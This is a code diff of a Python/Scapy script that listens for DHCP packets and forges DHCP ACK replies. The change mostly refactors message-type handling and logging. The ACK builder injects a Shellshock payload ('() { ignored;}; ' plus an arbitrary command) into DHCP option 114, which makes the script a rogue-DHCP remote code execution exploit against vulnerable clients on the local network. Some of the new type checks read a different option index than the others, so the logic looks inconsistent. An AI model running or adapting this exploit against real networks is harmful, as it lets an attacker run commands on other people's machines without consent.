@@ -10,12 +10,28 @@ import argparse
 #xid = transaction id 
 #chaddr = clients mac address in binary format
 
+DHCPTypes = {
+	"discover": 1,
+	"offer": 2,
+	"request": 3,
+	#TODO 4: "decline",
+	"ack": 5,
+	#TODO 6: "nak",
+	"release": 7,
+	#TODO 8: "inform",
+	#TODO 9: "force_renew",
+	#TODO 10: "lease_query",
+	#TODO 11: "lease_unassigned",
+	#TODO 12: "lease_unknown",
+	#TODO 13: "lease_active",
+}
+
 def dhcp_ack(raw_mac, xid, command):
-	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
-	IP(src="192.168.2.1", dst='255.255.255.255') /
-	UDP(sport=67, dport=68) /
-	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
-	DHCP(options=[("message-type", "ack"),
+	packet = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') 
+	packet /= IP(src="0.0.0.0", dst='255.255.255.255')
+	packet /= UDP(sport=67, dport=68)
+	packet /= BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid)
+	packet /= DHCP(options=[("message-type", "ack"),
 		('server_id', '192.168.2.1'),
 		('subnet_mask', '255.255.255.0'),
 		('router', '192.168.2.5'),
@@ -23,13 +39,13 @@ def dhcp_ack(raw_mac, xid, command):
 		('renewal_time', 86400),
 		('rebinding_time', 138240),
 		(114, "() { ignored;}; " + command),
-		"end"]))
+		"end"])
 	return packet
 
 
 # Fixup function to extract dhcp_options by key
 def get_option(dhcp_options, key):
-    must_decode = ['hostname', 'domain', 'vendor_class_id']
+    must_decode = ['hostname', 'domain', 'vendor_class_id', 'message-type']
     try:
         for i in dhcp_options:
             if i[0] == key:
@@ -50,18 +66,17 @@ def get_option(dhcp_options, key):
 def dhcp(resp):
 	if resp.haslayer(DHCP):
 		mac_addr = resp[Ether].src
-
+		xid = resp[BOOTP].xid
+		
 		# ---- DHCP DISCOVER ----
-		if resp[DHCP].options[0][1] == 1:
-			xid = resp[BOOTP].xid
+		if resp[DHCP].options[0][1] == DHCPTypes.get('discover'):
 			logging.info("[*] Got new DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
 			hostname = get_option(resp[DHCP].options, 'hostname')
 			logging.info(f"Host {hostname} ({resp[Ether].src}) asked for an IP")
-			logging.info(resp.show())
+			#logging.info(resp.show())
 
 		# ---- DHCP OFFER ----
-		if resp[DHCP].options[0][1] == 2:
-			xid = resp[BOOTP].xid
+		elif resp[DHCP].options[1][1] == DHCPTypes.get('offer'):
 			logging.info("[*] Got new DHCP OFFER from: " + mac_addr + " xid: " + hex(xid))
 			subnet_mask = get_option(resp[DHCP].options, 'subnet_mask')
 			lease_time = get_option(resp[DHCP].options, 'lease_time')
@@ -77,18 +92,16 @@ def dhcp(resp):
 			      f"domain: {domain}")
 
 		# ---- DHCP REQUEST ----
-		if resp[DHCP].options[0][1] == 3:
-			xid = resp[BOOTP].xid
+		elif resp[DHCP].options[0][1] == DHCPTypes.get('request'):
 			logging.info("[*] Got new DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
 			requested_addr = get_option(resp[DHCP].options, 'requested_addr')
 			hostname = get_option(resp[DHCP].options, 'hostname')
 			logging.info(f"Host {hostname} ({resp[Ether].src}) requested {requested_addr}")
-			logging.info(resp.show())
+			#logging.info(resp.show())
 			
 			
 		# ---- DHCP ACK ----
-		if resp[DHCP].options[0][1] == 5:
-			xid = resp[BOOTP].xid
+		elif resp[DHCP].options[1][1] == DHCPTypes.get('ack'):
 			logging.info("[*] Got new DHCP ACKNOLEDGMENT from: " + mac_addr + " xid: " + hex(xid))
 			subnet_mask = get_option(resp[DHCP].options, 'subnet_mask')
 			lease_time = get_option(resp[DHCP].options, 'lease_time')
@@ -102,7 +115,21 @@ def dhcp(resp):
 
 			logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
 			      f"{lease_time}, router: {router}, name_server: {name_server}, "
-			      f"domain: {domain}")	
+			      f"domain: {domain}")
+			  
+		# ---- DHCP RELEASE ----
+		elif resp[DHCP].options[0][1] == DHCPTypes.get('release'):
+			#print(resp.show())
+			ciaddr = resp[BOOTP].ciaddr
+			logging.info(f"[*] Got new DHCP RELEASE of {ciaddr} {mac_addr} xid: {hex(xid)}")
+			server_id = resp[DHCP].options[1][1]
+			hostname = get_option(resp[DHCP].options, 'hostname')
+			#TODO: check for rogue DHCP here (for certain server_id)
+			logging.info(f"Host {hostname} with IP {ciaddr} ({mac_addr}) released to {server_id}")
+			      
+		else:
+			print(f"I dont know this DHCP packet")
+			print(resp.show())
 
 
 def main():
@@ -121,7 +148,7 @@ def main():
 	args = parser.parse_args()
 	# settings for interface and dhcplock_filter
 	interface = 'enp0s9'
-	dhcplock_filter = 'udp and (port 67 or 68)'
+	dhcplock_filter = 'port 67 or port 68'
 	logging.info("[*] Waiting for a DHCP Packets...")
 	sniff(iface=interface, filter=dhcplock_filter, prn=dhcp)
 
